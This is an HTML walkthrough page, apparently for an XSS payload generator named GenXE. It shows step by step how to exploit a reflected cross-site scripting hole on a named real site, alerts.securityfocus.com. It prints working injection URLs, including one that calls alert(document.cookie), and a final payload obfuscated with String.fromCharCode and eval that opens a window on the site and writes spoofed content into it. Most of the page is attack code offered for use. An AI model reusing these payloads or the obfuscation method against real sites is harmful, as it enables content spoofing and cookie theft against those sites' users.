
<body bgcolor="#003399">
<p><font color="#33FFFF" face="Courier New, Courier, mono"><font size="5">SimpleXssExploit<br>
  --&gt; Shellscript-in-Another-Window Exploit</font><b><font size="5"><i> <br>
  </i>Walkthrough</font><br>
  SN:WS1-030921132200<br>
  <br>
  </b><font size="3"><b><font size="5"><i>Task Description</i></font></b><br>
  We have found an XSS at domain <b>alerts.securityfocus.com</b>,<br>
  Url is here:<br>
  <i><font size="2">http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</font></i><br>
  <br>
  We want to open a new window with the following Url displayed:<br>
  <font size="2"><i>http://alerts.securityfocus.com/ep/alerts-users/index.epl</i></font><br>
  <br>
  And display the following HTML Code in the new window:<br>
  <font size="2"><i>This site may be&lt;B&gt; faked!&lt;B&gt;</i></font><br>
  that means we'll execute the following script in the new window:<br>
  <font size="2"><i>document.write(&quot;</i></font></font><i><font color="#33FFFF" face="Courier New, Courier, mono" size="2">This 
  site may be&lt;B&gt; faked!&lt;B&gt;</font><font size="2">&quot;);<br>
  setTimeout(&quot;document.close()&quot;,1000);</font></i><font size="2"><br>
  </font><font size="3"><font size="5"><br>
  <b><i>Step-By-Step Walkthrough</i></b></font><br>
  Step 1/4.Construct Simple Xss exploit that pops up an &quot;alert&quot; messagebox 
  with text <b>genxea(genxem,genxem)genxea</b><i> </i><br>
  <br>
  <i><font size="2">http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;alert(&quot;genxea(genxem,genxem)genxea&quot;)&lt;/script&gt;</font></i><br>
  <br>
  </font><font color="#33FFFF" face="Courier New, Courier, mono"><font size="3">Step 
  2/4</font></font><font size="3">.Open GenXE, and choose to generate<br>
  Shellscript-in-Another-Window Exploit, like:<br>
  <br>
  <img src="choose.JPG" width="687" height="423"> </font><br>
  <br>
  <font color="#33FFFF" face="Courier New, Courier, mono"><font size="3">Step 
  3/4</font></font><font size="3">.Copy-And-Paste to fill three fields:<br>
  <b>[1/3]</b>SimpleXssExploit<br>
  </font><font color="#33FFFF" face="Courier New, Courier, mono"><font size="3"><i><font size="2">http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;alert(&quot;genxea(genxem,genxem)genxea&quot;)&lt;/script&gt;</font></i><br>
  </font></font><b>[2/3]</b>Script that intialize <i><font size="2">DestW</font></i> 
  variable, that is:<br>
  <font size="3"><font size="2"><i>DestW=window.open(&quot;http://alerts.securityfocus.com/ep/alerts-users/index.epl</i></font></font>&quot;);<br>
  <b>[3/3]</b>And Shellscript-in-Another-Window:<br>
  <font size="3"><font size="2"><i>document.write(&quot;</i></font></font><i><font color="#33FFFF" face="Courier New, Courier, mono" size="2">This 
  site may be&lt;B&gt; faked!&lt;B&gt;</font><font size="2">&quot;);<br>
  setTimeout(&quot;document.close()&quot;,1000);</font></i><font size="2"><br>
  </font><font size="3"><font size="5"></font></font> <br>
  <br>
  <font size="3">Step 4/4</font>.Press the button<br>
  <img src="generatebutton.jpg" width="313" height="58"> <br>
  <br>
  At last, we get this:<br>
  <i><font size="2"> http://alerts.securityfocus.com/ep/alerts-users/index.epl?cid=1&amp;redirect_page=&quot;&gt;&lt;script&gt;eval(&quot;eval(String.fromCharCode(68,101,115,116,87,61,110,117,108,108,59,101,118,97,108,40,117,110,101,115,99,97,112,101,40,39,68,101,115,116,87,37,51,68,119,105,110,100,111,119,46,111,112,101,110,37,50,56,37,50,50,104,116,116,112,37,51,65,47,47,97,108,101,114,116,115,46,115,101,99,117,114,105,116,121,102,111,99,117,115,46,99,111,109,47,101,112,47,97,108,101,114,116,115,45,117,115,101,114,115,47,105,110,100,101,120,46,101,112,108,37,50,50,37,50,57,37,51,66,39,41,41,59,102,117,110,99,116,105,111,110,32,69,120,101,99,117,116,101,83,97,119,40,41,123,105,102,40,68,101,115,116,87,33,61,110,117,108,108,41,123,68,101,115,116,87,46,115,101,116,84,105,109,101,111,117,116,40,117,110,101,115,99,97,112,101,40,39,100,111,99,117,109,101,110,116,46,119,114,105,116,101,37,50,56,37,50,50,84,104,105,115,37,50,48,115,105,116,101,37,50,48,109,97,121,37,50,48,98,101,37,51,67,66,37,51,69,37,50,48,102,97,107,101,100,37,50,49,37,51,67,66,37,51,69,37,50,50,37,50,57,37,51,66,37,48,65,115,101,116,84,105,109,101,111,117,116,37,50,56,37,50,50,100,111,99,117,109,101,110,116,46,99,108,111,115,101,37,50,56,37,50,57,37,50,50,37,50,67,49,48,48,48,37,50,57,37,51,66,39,41,44,49,41,59,68,101,115,116,87,61,110,117,108,108,59,125,101,108,115,101,123,115,101,116,84,105,109,101,111,117,116,40,39,69,120,101,99,117,116,101,83,97,119,40,41,39,44,49,48,48,41,59,125,125,69,120,101,99,117,116,101,83,97,119,40,41,59))&quot;)&lt;/script&gt; 
  </font></i><br>
  </font><font color="#33FFFF" face="Courier New, Courier, mono" size="2"></font><font color="#33FFFF" face="Courier New, Courier, mono"><br>
  It works as we expected.<br>
  <br>
  </font></p>
